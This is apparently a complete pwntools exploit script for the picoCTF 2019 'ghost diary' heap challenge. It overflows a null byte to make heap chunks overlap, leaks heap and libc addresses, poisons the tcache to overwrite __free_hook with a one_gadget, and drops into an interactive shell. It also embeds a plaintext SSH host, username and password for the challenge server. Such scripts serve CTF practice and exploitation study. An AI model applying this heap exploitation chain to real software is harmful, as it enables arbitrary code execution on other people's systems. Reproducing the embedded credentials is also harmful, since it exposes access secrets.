from pwn import *

r = None

main_arena_offset = 0x3ebee0
one_gadget_offset = 0x4f3c2

def add(size):
    if 0x10f < size <= 0x1e0:
        double = True
    elif size <= 0xf0:
        double = False
    else:
        print('Cannot allocate size')
        exit()
    
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', '2' if double else '1')
    r.sendlineafter('size: ', str(int(size)))

def write(index, data):

    r.sendlineafter('> ', '2')
    r.sendlineafter('Page: ', str(index))
    r.sendlineafter('Content: ', data)

def read(index):

    r.sendlineafter('> ', '3')
    r.sendlineafter('Page: ', str(index))

    return r.recvuntil('1.')[:-3]

def delete(index):
    r.sendlineafter('> ', '4')
    r.sendlineafter('Page: ', str(index))

target = ELF('./ghostdiary')
libc   = ELF('./libc-2.27.so', checksec=False)

#r = process(['./ld-2.27.so', './ghostdiary'], env={'LD_PRELOAD': './libc-2.27.so'})
conn = ssh(host='2019shell1.picoctf.com', user='rulio', password='Y6vJ4TQEKjZnDXxWoav8345v6PtdXM2u')
r = conn.process('/problems/ghost-diary_6_5a9aa6b551e71294dfdc06646d2d7104/ghostdiary')

#gdb.attach(r, gdbscript='c')

log.info('Allocating chunks for overlap')
add(0xf0) # 0 chunk that will overlap other chunks
add(0x28) # 1 will be overlaped by 0
add(0x28) # 2 will overflow in_use of next chunk
add(0xf0) # 3 will be overflown


# filling tcache
log.info('Filling tcache')
for x in range(7):
    add(0xf0)

for x in range(4, 11):
    delete(x)

#raw_input('bk1')

log.info('Alocating tcache size to get addr of next tcache')
add(0xf0) # 4 
leak = read(4).split(':')[1:][0][1:]
leak = u64(leak.ljust(8, '\x00'))

chunk0_addr = leak - 0x760
log.success('chunk#0 addr: ' + hex(chunk0_addr))

delete(4) # put it back on tcache

log.info('Crafting fake chunk to bypass prev_size malloc check...')
fake_chunk  = p64(0x0)
fake_chunk += p64(0x151) # chunk overlap size + prev in_use bit
fake_chunk += p64(chunk0_addr) # fd addr to trick malloc check
fake_chunk += p64(chunk0_addr) # bk addr to trick malloc check

write(0, fake_chunk) # writting fake chunk into the heap
#raw_input('bk1')
write(2, 'A'*(0x28-0x08) + p64(0x150)) # overflowing null byte into chunk 3
#raw_input('bk2')

log.info('Triggering chunk coalescing')
delete(3) # 3 triggering bk coalescing

#raw_input('bk1')

log.info('Allocating coalesced chunk')
add(0x1e0) # now its the 3rd page

#raw_input('bk2')

main_arena_addr = read(3).split(':')[1:][0][1:]
main_arena_addr= u64(main_arena_addr.ljust(8, '\x00'))
log.success('main_arena addr: ' + hex(main_arena_addr))

libc_base = main_arena_addr - main_arena_offset
log.success('libc base addr: ' + hex(libc_base))

one_gadget_addr = libc_base + one_gadget_offset
log.success('one_gadget addr: ' + hex(one_gadget_addr))

#system_addr = libc_base + libc.sym['system']
#log.info('system addr: ' + hex(system_addr))

free_hook_addr = libc_base + libc.sym['__free_hook']
log.success('__free_hook addr: ' + hex(free_hook_addr))

#raw_input('bk1')
log.info('Starting tcache fd poisoning')

delete(1) # 1

write(3, 'A'*0xe0 + 'B'*0x08 + p64(0x31) + p64(free_hook_addr) + p64(free_hook_addr))

add(0x28) # 1
add(0x28) # 4

write(4, p64(one_gadget_addr))

log.info('Triggering __free_hook')
delete(1)

print(r.recv())

r.interactive()
